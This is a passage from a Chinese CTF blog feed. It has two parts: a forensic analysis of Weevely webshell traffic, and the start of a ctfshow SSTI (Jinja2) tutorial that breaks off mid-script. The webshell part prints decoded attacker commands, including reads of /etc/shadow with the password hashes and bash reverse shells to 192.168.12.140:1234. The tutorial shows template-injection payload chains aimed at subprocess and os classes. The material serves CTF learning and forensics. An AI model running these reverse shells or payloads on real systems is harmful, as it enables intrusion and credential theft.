class="variable">$arrlength</span>=count(<span class="variable">$phpinput</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, <span class="variable">$phpinput</span>[<span class="variable">$x</span>], <span class="variable">$m</span>) == <span class="number">1</span>) &#123; <span class="comment">// if $kh and $kf exist in php://input, store matches in array $m; if debugged with print_r($m) you will notice that $m[0] is $kh + b64data + $kf and $m[1] is b64data only</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$phpcode</span> = @gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)); <span class="comment">// gunzip(XOR(b64decode(data), key))</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$phpcode</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_start(); // Turn on output buffering</span></span><br><span class="line"><span class="comment">    <span class="doctag">@eval</span>($phpcode); // Executes PHP code</span></span><br><span class="line"><span class="comment">    $o = <span class="doctag">@ob</span>_get_contents(); // Save stdout to $o</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_end_clean(); // Clean (erase) the output buffer and turn off output buffering</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    $r = <span class="doctag">@base</span>64_encode(<span class="doctag">@x</span>(<span class="doctag">@gzcompress</span>($o), $k)); // b64encode(XOR(gzip(stdout)), key)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    print(&quot;$p$kh$r$kf&quot;); // HTTP Response data</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>(<span class="number">53368</span>);<span class="number">53368</span>@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;echo 49886&#x27;</span>);<span class="number">49886</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);<span class="keyword">print</span>(@gethostname());simple@error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(is_callable(<span class="string">&#x27;posix_getpwuid&#x27;</span>)&amp;&amp;is_callable(<span class="string">&#x27;posix_geteuid&#x27;</span>))&#123;<span class="variable">$u</span>=@posix_getpwuid(@posix_geteuid());<span class="keyword">if</span>(<span class="variable">$u</span>)&#123;<span class="variable">$u</span>=<span class="variable">$u</span>[<span class="string">&#x27;name&#x27;</span>];&#125;<span class="keyword">else</span>&#123;<span class="variable">$u</span>=getenv(<span class="string">&#x27;username&#x27;</span>);&#125;<span class="keyword">print</span>(<span class="variable">$u</span>);&#125;apache@error_reporting(<span class="number">0</span>);@chdir(<span class="string">&#x27;.&#x27;</span>)&amp;&amp;<span class="keyword">print</span>(@getcwd());/<span class="keyword">var</span>/www/htmlchdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;id 2&gt;&amp;1&#x27;</span>);uid=<span class="number">48</span>(apache) gid=<span class="number">48</span>(apache) groups=<span class="number">48</span>(apache)      </span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;uname -a 2&gt;&amp;1&#x27;</span>);Linux simple <span class="number">3.10</span>.<span class="number">0</span>-<span class="number">693.5</span>.<span class="number">2</span>.el7.x86_64 <span class="comment">#1 SMP Fri Oct 20 20:32:50 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;cat /etc/*relea* 2&gt;&amp;1&#x27;</span>);CentOS Linux release <span class="number">7.4</span>.<span class="number">1708</span> (Core)</span><br><span class="line">Derived <span class="keyword">from</span> Red Hat Enterprise Linux <span class="number">7.4</span> (Source)</span><br><span class="line">NAME=<span class="string">&quot;CentOS Linux&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;7 (Core)&quot;</span></span><br><span class="line">ID=<span class="string">&quot;centos&quot;</span></span><br><span class="line">ID_LIKE=<span class="string">&quot;rhel fedora&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;7&quot;</span></span><br><span class="line">PRETTY_NAME=<span class="string">&quot;CentOS Linux 7 (Core)&quot;</span></span><br><span class="line">ANSI_COLOR=<span class="string">&quot;0;31&quot;</span></span><br><span class="line">CPE_NAME=<span class="string">&quot;cpe:/o:centos:centos:7&quot;</span></span><br><span class="line">HOME_URL=<span class="string">&quot;https://www.centos.org/&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;https://bugs.centos.org/&quot;</span></span><br><span class="line"></span><br><span class="line">CENTOS_MANTISBT_PROJECT=<span class="string">&quot;CentOS-7&quot;</span></span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=<span class="string">&quot;7&quot;</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT=<span class="string">&quot;centos&quot;</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=<span class="string">&quot;7&quot;</span></span><br><span class="line"></span><br><span class="line">CentOS Linux release <span class="number">7.4</span>.<span class="number">1708</span> (Core)</span><br><span class="line">CentOS Linux release <span class="number">7.4</span>.<span class="number">1708</span> (Core)</span><br><span class="line">cpe:/o:centos:centos:<span class="number">7</span></span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;ls -l /etc/shadow 2&gt;&amp;1&#x27;</span>);-rwxr--r-- <span class="number">1</span> root root <span class="number">912</span> Dec  <span class="number">4</span> <span class="number">15</span>:<span class="number">31</span> /etc/shadow</span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;cat /etc/shadow 2&gt;&amp;1&#x27;</span>);root:$<span class="number">6</span><span class="variable">$yxsi</span>.<span class="number">1</span>Ma<span class="variable">$OZVDHL1S8Uq34AaBRURsdSu</span>/o/i4S4tZ66A08k3yMuEYehGn8zpwpMJIS59t.dqdKjj22KakQNwbuIjQc5JV20:<span class="number">18234</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">bin:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">daemon:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">adm:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lp:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sync:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">shutdown:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">halt:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">mail:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">operator:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">games:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">ftp:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">nobody:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">avahi-autoipd:!!:<span class="number">17483</span>::::::</span><br><span class="line">dbus:!!:<span class="number">17483</span>::::::</span><br><span class="line">polkitd:!!:<span class="number">17483</span>::::::</span><br><span class="line">tss:!!:<span class="number">17483</span>::::::</span><br><span class="line">postfix:!!:<span class="number">17483</span>::::::</span><br><span class="line">sshd:!!:<span class="number">17483</span>::::::</span><br><span class="line">simple:$<span class="number">6</span><span class="variable">$OKhnPP</span>.<span class="number">6</span>XfWK/Qjk$<span class="number">701</span>eOD87cni/<span class="number">1</span>IShASWs1nkLOOWWZdZZTflk6cw3fBdZwffib4aEYfUoUhDGZ9KJGQc64sJk8XptdK1zVeVmC1:<span class="number">17483</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-network:!!:<span class="number">17483</span>::::::</span><br><span class="line">geoclue:!!:<span class="number">17483</span>::::::</span><br><span class="line">rtkit:!!:<span class="number">17483</span>::::::</span><br><span class="line">colord:!!:<span class="number">17483</span>::::::</span><br><span class="line">pulse:!!:<span class="number">17483</span>::::::</span><br><span class="line">gdm:!!:<span class="number">17483</span>::::::</span><br><span class="line">chrony:!!:<span class="number">17483</span>::::::</span><br><span class="line">mysql:!!:<span class="number">17946</span>::::::</span><br><span class="line">apache:!!:<span class="number">17946</span>::::::</span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;/bin/bash -i &gt;&amp;/dev/tcp/192.16.12.140/1234 0&gt;&amp;1 2&gt;&amp;1&#x27;</span>);chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;ping -c 2 192.168.12.140 2&gt;&amp;1&#x27;</span>);PING <span class="number">192.168</span>.<span class="number">12.140</span> (<span class="number">192.168</span>.<span class="number">12.140</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">12.140</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.746</span> ms</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">12.140</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">64</span> time=<span class="number">1.07</span> ms</span><br><span class="line"></span><br><span class="line">--- <span class="number">192.168</span>.<span class="number">12.140</span> ping statistics ---</span><br><span class="line"><span class="number">2</span> packets transmitted, <span class="number">2</span> received, <span class="number">0</span>% packet loss, time <span class="number">1000</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">0.746</span>/<span class="number">0.911</span>/<span class="number">1.076</span>/<span class="number">0.165</span> ms</span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;bash -i &gt;&amp;/dev/tcp/192.168.12.140/1234 0&gt;&amp;1 2&gt;&amp;1&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯èƒ½æœ‰ç‚¹ä¹±ï¼Œä¸è¿‡ä¸å½±å“äº†åº”è¯¥ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„å†…å®¹äº†</p><p>è¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ªåå¼¹äº†shellï¼Œbash -i &gt;&amp;/dev/tcp/192.168.12.140/1234 0&gt;&amp;1 2&gt;&amp;1</p><p>è´¦å·å¯†ç çš„è¯ï¼Œå¯ä»¥johnçˆ†ç ´ï¼Œå¾ˆç®€å•ï¼Œåœ¨kaliä¸Šæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶å ç›´æ¥john a.txtå³å¯</p><p><img src="/images/tiesan/image-20230505204836260.png" alt="image-20230505204836260"></p><p><img src="/images/tiesan/image-20230505205041689.png" alt="image-20230505205041689"></p><p>è·‘äº†å¾ˆä¹…ï¼Œsimpleçš„å¯†ç æ²¡æœ‰è·‘å‡ºæ¥ï¼Œrootå¯†ç ä¸º123456ã€‚</p><p>åˆ°è¿™é‡Œæ‰€æœ‰çš„ä¿¡æ¯å°±éƒ½çŸ¥é“äº†ã€‚</p><p>å¦‚æœæ‰“åŒ…é¢˜ç›®çš„å¸ˆå‚…ï¼Œå¯ä»¥ç•™è¨€ã€‚æˆ‘å¿˜è®°æ‰“åŒ…æ•´ç«™ç›®å½•äº†ã€‚</p><h4 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> æµé‡åˆ†æ </tag>
            
            <tag> ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ› </tag>
            
            <tag> é•¿åŸæ¯ </tag>
            
            <tag> weevelyåˆ†æ </tag>
            
            <tag> æº¯æºå–è¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sstiå­¦ä¹ </title>
      <link href="/2023/04/07/ctfshow-ssti%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/04/07/ctfshow-ssti%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="SSTIæ˜¯ä»€ä¹ˆ"><a href="#SSTIæ˜¯ä»€ä¹ˆ" class="headerlink" title="SSTIæ˜¯ä»€ä¹ˆ"></a>SSTIæ˜¯ä»€ä¹ˆ</h3><p>SSTIï¼ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æ¨¡æ¿å¼•æ“+æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹æ¨¡æ¿å¼•æ“</p><blockquote><p>æ¨¡æ¿å¼•æ“æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®åˆ†ç¦»è€Œäº§ç”Ÿï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„ HTML ä»£ç ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆ HTML ä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆæ¨¡æ¿ + ç”¨æˆ·æ•°æ®çš„å‰ç«¯ HTML é¡µé¢ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚</p></blockquote><p>æ¨¡æ¿åªæ˜¯ä¸€ç§æä¾›ç»™ç¨‹åºæ¥è§£æçš„ä¸€ç§è¯­æ³•ï¼Œæ¢å¥è¯è¯´ï¼Œæ¨¡æ¿æ˜¯ç”¨äºä»æ•°æ®ï¼ˆå˜é‡ï¼‰åˆ°å®é™…çš„è§†è§‰è¡¨ç°ï¼ˆHTMLä»£ç ï¼‰è¿™é¡¹å·¥ä½œçš„ä¸€ç§å®ç°æ‰‹æ®µï¼Œè€Œè¿™ç§æ‰‹æ®µä¸è®ºåœ¨å‰ç«¯è¿˜æ˜¯åç«¯éƒ½æœ‰åº”ç”¨ã€‚<br>é€šä¿—ç‚¹ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚</p><p>å¸¸è§çš„æ¨¡æ¿å¼•æ“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP: Smarty, Twig, Blade</span><br><span class="line">JAVA: JSP, FreeMarker, Velocity</span><br><span class="line">Python: Jinja2, django, tornado</span><br></pre></td></tr></table></figure><p>ç”±äºæ¸²æŸ“çš„æ•°æ®æ˜¯ä¸šåŠ¡æ•°æ®,ä¸”å¤§å¤šæ•°éƒ½ç”±ç”¨æˆ·æä¾›,è¿™å°±æ„å‘³ç€ç”¨æˆ·å¯¹è¾“å…¥å¯æ§.å¦‚æœåç«¯æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œæ£€æµ‹å’Œåˆ¤æ–­,é‚£ä¹ˆå°±å®¹æ˜“äº§ç”Ÿä»£ç å’Œæ•°æ®æ··æ·†,ä»è€Œäº§ç”Ÿæ³¨å…¥.</p><p>åœ¨ SSTI æ¼æ´ç‚¹ä¸­ï¼Œ é‡Œé¢çš„å†…å®¹ä¼šè¢«æ‰§è¡Œã€‚</p><p>æ­¤ç¯‡æ–‡ç« ä»…æ¢ç©¶pythonä¸­ssti</p><p>é¢˜ç›®åœ°å€    <a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p><blockquote><p>ä¸ªäººç†è§£sstié¢˜ç›®å°±æ˜¯è·å–ä¸€äº›å±é™©å­ç±»ï¼Œåœ¨å±é™©å­ç±»ä¸­å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„å‡½æ•°æ¥å‘½ä»¤æ‰§è¡Œæˆ–æ–‡ä»¶è¯»å–ç­‰</p></blockquote><h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h4><p>åœ¨å­¦ä¹ SSTIæ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€äº›pythonçš„é­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»</p><p><code>__class__</code>ç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»<br>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;abcd&#x27;.__class__</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;class &#x27;tuple&#x27;&gt;</span><br></pre></td></tr></table></figure><p><code>__base__</code>ç”¨äºè·å–ç±»çš„åŸºç±»ï¼ˆä¹Ÿç§°çˆ¶ç±»ï¼‰<br>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__base__</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">//objectä¸ºstrçš„åŸºç±»</span><br></pre></td></tr></table></figure><p><code>__mro__</code>è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºã€‚ï¼ˆå½“è°ƒç”¨_mro_[1]æˆ–è€…-1æ—¶ä½œç”¨å…¶å®ç­‰åŒäº_base_ï¼‰<br>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[1]</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[-1]</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure><p><code>__subclasses__()</code>å¯ä»¥è·å–ç±»çš„æ‰€æœ‰å­ç±»<br>ç¤ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[-1].__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;,&lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;...]</span><br></pre></td></tr></table></figure><h4 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h4><p>é¢˜ç›®ä¼ å‚ä¸ºname ä¹Ÿå°±æ˜¯/?name=1</p><p><a href="http://7650d43c-2ae1-4428-aa41-80f2cd571827.challenge.ctf.show/?name=1">http://7650d43c-2ae1-4428-aa41-80f2cd571827.challenge.ctf.show/?name=1</a></p><p>å›æ˜¾ä¸º1ï¼Œæµ‹è¯•æ˜¯å¦å­˜åœ¨sstiæ¼æ´ï¼Œ</p><p><code>payloadï¼šhttp://7650d43c-2ae1-4428-aa41-80f2cd571827.challenge.ctf.show/?name=&#123;&#123;7*7&#125;&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">æ­£å¸¸æ²¡æœ‰æ¼æ´å°†å›æ˜¾ä¼ å…¥çš„å€¼ï¼Œç„¶è€Œ`Flask`ä¸­ä½¿ç”¨äº†`Jinja2` ä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œ&#123;&#123;&#125;&#125;åœ¨`Jinja2`ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼Œ`Jinja2`åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ&#123;&#123;&#125;&#125;åŒ…è£¹çš„å†…å®¹è¿›è¡Œè§£æã€‚`&#123;&#123;7*7&#125;&#125;`ä¼šè¢«è§£ææˆ49ã€‚</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸€æ­¥ä½¿ç”¨ classè·å–å½“å‰ç±»ä½¿ç”¨`__class__`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;1.__class__\&#125;\&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">&lt;class &#x27;int&#x27;&gt;</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;a.__class__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">&lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç¬¬äºŒæ­¥ä½¿ç”¨ è·å–å½“å‰ç±»çš„åŸºç±»ï¼Œè¿™é‡Œå¯ä»¥ç”¨`__base__`ï¼Œä¹Ÿå¯ä»¥ç”¨`__mro__`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">å–object</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br><span class="line">æˆ–</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">æˆ–</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[-1]&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰æ­¥è·å–åŸºç±»çš„å­ç±»ï¼Œè¿™é‡Œå¯ä»¥ç”¨`__subclasses__()`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;,........</span><br></pre></td></tr></table></figure><p>ç¬¬å››æ­¥ï¼Œè·å–å¯ä»¥ä½¿ç”¨ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">è„šæœ¬<span class="number">1</span>  æœ¬åœ°æŸ¥æ‰¾</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æŸ¥æ‰¾åˆ°çš„çˆ¶ç±»åˆ—è¡¨æ›¿æ¢åˆ°dataä¸­</span></span><br><span class="line">data = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åœ¨è¿™é‡Œæ·»åŠ å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œä¸‹é¢ä¼šä»‹ç»è¿™äº›ç±»çš„åˆ©ç”¨æ–¹æ³•</span></span><br><span class="line">userful_class = [<span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;os._wrap_close&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, <span class="string">&#x27;warnings.catch_warnings&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>, <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> class_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> userful_class:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(class_list.index(c)) + <span class="string">&quot;: &quot;</span> + c)</span><br><span class="line">            </span><br><span class="line">//          </span><br><span class="line">è„šæœ¬<span class="number">2</span> åœ¨çº¿æŸ¥æ‰¾</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 